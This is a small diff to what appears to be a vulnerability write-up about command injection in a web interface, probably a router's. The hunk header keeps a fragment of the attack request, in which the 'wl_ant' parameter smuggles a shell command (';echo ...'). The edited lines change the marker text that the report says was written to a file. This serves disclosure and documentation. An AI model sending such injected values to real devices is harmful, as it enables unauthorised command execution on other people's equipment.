@@ -26,5 +26,5 @@ need_reboot=1&commit=1&need_action=1&nvset_cgi=1&StartEPI=1&wl_ant=%3Becho%20%22
 
 
 # result
-I successfully touch a file with the content "hacker_payload_ttcp_ip"
+I successfully touch a file with the content "hacker_payload_ttcp_num"
 ![alt text](imgs/image.png)
